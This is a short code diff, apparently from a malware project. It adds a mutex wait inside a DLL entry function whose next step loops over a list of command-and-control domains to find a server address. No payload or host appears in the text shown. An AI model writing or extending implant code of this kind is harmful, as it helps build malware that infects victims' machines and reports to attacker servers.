@@ -83,6 +83,7 @@ DWORD dll_main(LPVOID param) {
     if (nullptr == mutex) {
         return 0;
     }
+    WaitForSingleObject(mutex, INFINITE);
     std::string cnc_ip = "";
     while (cnc_ip == "") {
         for (const std::string& domain : CNC_DOMAINS) {
